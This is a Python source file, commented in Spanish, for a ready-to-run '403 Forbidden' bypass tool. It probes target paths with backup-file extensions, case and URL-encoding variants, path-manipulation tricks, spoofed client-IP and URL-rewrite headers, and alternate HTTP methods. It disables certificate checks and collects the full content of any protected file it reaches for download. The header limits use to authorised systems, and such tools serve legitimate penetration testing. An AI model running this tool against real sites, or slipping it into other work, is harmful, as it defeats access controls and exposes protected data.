"""
403 Bypass Tool - Intenta evadir protecciones 403 Forbidden
Solo para uso en sistemas propios o con autorización explícita
"""

import requests
from dataclasses import dataclass, field
from typing import List, Dict, Optional
from urllib.parse import urljoin, quote, urlparse
import time
from concurrent.futures import ThreadPoolExecutor, as_completed


@dataclass
class BypassResult:
    original_path: str
    original_status: int
    bypasses_found: List[Dict]
    techniques_tried: int
    duration: float
    details: List[str] = field(default_factory=list)


@dataclass 
class FullBypassReport:
    target_url: str
    paths_tested: int
    total_bypasses: int
    results: List[BypassResult]
    duration: float
    downloadable_files: List[Dict] = field(default_factory=list)


class Bypass403:
    """
    Intenta múltiples técnicas para evadir protecciones 403
    """
    
    BACKUP_EXTENSIONS = [
        ".bak", ".backup", ".old", ".save", ".orig", 
        ".copy", ".tmp", ".temp", "~", ".swp", ".swo",
        ".1", ".2", "_backup", "_old", "_bak",
        ".txt", ".log", ".inc"
    ]
    
    CASE_VARIANTS = [
        lambda p: p.upper(),
        lambda p: p.lower(),
        lambda p: p.capitalize(),
        lambda p: p.swapcase(),
    ]
    
    ENCODING_VARIANTS = [
        lambda p: quote(p, safe=''),
        lambda p: quote(quote(p, safe=''), safe=''),
        lambda p: p.replace("/", "%2f"),
        lambda p: p.replace("/", "%2F"),
        lambda p: p.replace(".", "%2e"),
        lambda p: p.replace(".", "%2E"),
    ]
    
    PATH_MANIPULATION = [
        lambda p: f"/{p}",
        lambda p: f"//{p}",
        lambda p: f"./{p}",
        lambda p: f"..;/{p}",
        lambda p: f";/{p}",
        lambda p: f".;/{p}",
        lambda p: f"%2e/{p}",
        lambda p: f"{p}/",
        lambda p: f"{p}/.",
        lambda p: f"{p}//",
        lambda p: f"{p}%20",
        lambda p: f"{p}%09",
        lambda p: f"{p}?",
        lambda p: f"{p}??",
        lambda p: f"{p}#",
        lambda p: f"{p}/*",
        lambda p: f"{p}.html",
        lambda p: f"{p}.php",
        lambda p: f"{p}.json",
    ]
    
    BYPASS_HEADERS = [
        {"X-Original-URL": "/{path}"},
        {"X-Rewrite-URL": "/{path}"},
        {"X-Custom-IP-Authorization": "127.0.0.1"},
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Forwarded-Host": "127.0.0.1"},
        {"X-Host": "127.0.0.1"},
        {"X-Real-IP": "127.0.0.1"},
        {"X-Originating-IP": "127.0.0.1"},
        {"X-Remote-IP": "127.0.0.1"},
        {"X-Remote-Addr": "127.0.0.1"},
        {"X-Client-IP": "127.0.0.1"},
        {"X-Forwarded": "127.0.0.1"},
        {"Forwarded-For": "127.0.0.1"},
        {"Forwarded": "for=127.0.0.1"},
        {"X-ProxyUser-Ip": "127.0.0.1"},
        {"Client-IP": "127.0.0.1"},
        {"True-Client-IP": "127.0.0.1"},
        {"Cluster-Client-IP": "127.0.0.1"},
        {"Referer": "https://www.google.com/"},
    ]
    
    HTTP_METHODS = ["GET", "POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS", "TRACE", "CONNECT"]
    
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        })
        self.session.verify = False
        requests.packages.urllib3.disable_warnings()
    
    def _try_request(self, url: str, method: str = "GET", 
                     headers: Optional[Dict] = None, 
                     technique_name: str = "") -> Optional[Dict]:
        """Intenta una request y retorna info si es exitosa"""
        try:
            extra_headers = headers or {}
            response = self.session.request(
                method, url, 
                headers=extra_headers,
                timeout=5, 
                allow_redirects=False
            )
            
            if response.status_code == 200:
                content_preview = ""
                content = response.text
                if len(content) > 500:
                    content_preview = content[:500] + "..."
                else:
                    content_preview = content
                
                return {
                    "technique": technique_name,
                    "url": url,
                    "method": method,
                    "status": response.status_code,
                    "size": len(response.content),
                    "content_type": response.headers.get("Content-Type", "unknown"),
                    "content_preview": content_preview,
                    "full_content": content,
                    "headers_used": extra_headers
                }
            
            return None
            
        except Exception:
            return None
    
    def bypass_single_path(self, base_url: str, path: str, 
                           include_backups: bool = True,
                           include_encoding: bool = True,
                           include_headers: bool = True,
                           include_methods: bool = True) -> BypassResult:
        """
        Intenta bypass de 403 para un path específico
        """
        if not base_url.endswith("/"):
            base_url += "/"
        
        start_time = time.time()
        bypasses_found = []
        techniques_tried = 0
        
        original_url = urljoin(base_url, path.lstrip("/"))
        try:
            orig_response = self.session.get(original_url, timeout=5)
            original_status = orig_response.status_code
        except:
            original_status = 0
        
        if include_backups:
            base_path = path.rstrip("/")
            for ext in self.BACKUP_EXTENSIONS:
                test_path = f"{base_path}{ext}"
                test_url = urljoin(base_url, test_path.lstrip("/"))
                result = self._try_request(test_url, technique_name=f"Backup: {ext}")
                techniques_tried += 1
                if result:
                    bypasses_found.append(result)
        
        for variant_fn in self.CASE_VARIANTS:
            try:
                test_path = variant_fn(path)
                if test_path != path:
                    test_url = urljoin(base_url, test_path.lstrip("/"))
                    result = self._try_request(test_url, technique_name=f"Case: {test_path}")
                    techniques_tried += 1
                    if result:
                        bypasses_found.append(result)
            except:
                pass
        
        if include_encoding:
            for i, enc_fn in enumerate(self.ENCODING_VARIANTS):
                try:
                    test_path = enc_fn(path)
                    test_url = urljoin(base_url, test_path)
                    result = self._try_request(test_url, technique_name=f"Encoding #{i+1}")
                    techniques_tried += 1
                    if result:
                        bypasses_found.append(result)
                except:
                    pass
        
        for manip_fn in self.PATH_MANIPULATION:
            try:
                test_path = manip_fn(path.lstrip("/"))
                test_url = base_url.rstrip("/") + "/" + test_path.lstrip("/") if not test_path.startswith("/") else base_url.rstrip("/") + test_path
                result = self._try_request(test_url, technique_name=f"Path: {test_path[:30]}")
                techniques_tried += 1
                if result:
                    bypasses_found.append(result)
            except:
                pass
        
        if include_headers:
            for header_dict in self.BYPASS_HEADERS:
                headers = {}
                for k, v in header_dict.items():
                    headers[k] = v.replace("{path}", "/" + path.lstrip("/"))
                
                result = self._try_request(original_url, headers=headers, 
                                          technique_name=f"Header: {list(header_dict.keys())[0]}")
                techniques_tried += 1
                if result:
                    bypasses_found.append(result)
        
        if include_methods:
            for method in self.HTTP_METHODS:
                if method != "GET":
                    result = self._try_request(original_url, method=method,
                                              technique_name=f"Method: {method}")
                    techniques_tried += 1
                    if result:
                        bypasses_found.append(result)
        
        duration = time.time() - start_time
        
        details = [
            f"Path original: {path}",
            f"Status original: {original_status}",
            f"Técnicas probadas: {techniques_tried}",
            f"Bypasses encontrados: {len(bypasses_found)}"
        ]
        
        return BypassResult(
            original_path=path,
            original_status=original_status,
            bypasses_found=bypasses_found,
            techniques_tried=techniques_tried,
            duration=duration,
            details=details
        )
    
    def analyze(self, base_url: str, paths: List[str],
                include_backups: bool = True,
                include_encoding: bool = True,
                include_headers: bool = True,
                include_methods: bool = False,
                threads: int = 5) -> FullBypassReport:
        """
        Analiza múltiples paths intentando bypass de 403
        """
        start_time = time.time()
        all_results = []
        downloadable = []
        
        for path in paths:
            result = self.bypass_single_path(
                base_url, path,
                include_backups=include_backups,
                include_encoding=include_encoding,
                include_headers=include_headers,
                include_methods=include_methods
            )
            all_results.append(result)
            
            for bypass in result.bypasses_found:
                downloadable.append({
                    "original_path": path,
                    "bypass_url": bypass["url"],
                    "technique": bypass["technique"],
                    "size": bypass["size"],
                    "content": bypass["full_content"]
                })
        
        duration = time.time() - start_time
        total_bypasses = sum(len(r.bypasses_found) for r in all_results)
        
        return FullBypassReport(
            target_url=base_url,
            paths_tested=len(paths),
            total_bypasses=total_bypasses,
            results=all_results,
            duration=duration,
            downloadable_files=downloadable
        )


def analyze(url: str, paths: List[str], **kwargs) -> FullBypassReport:
    """Función de conveniencia para análisis rápido"""
    bypasser = Bypass403()
    return bypasser.analyze(url, paths, **kwargs)
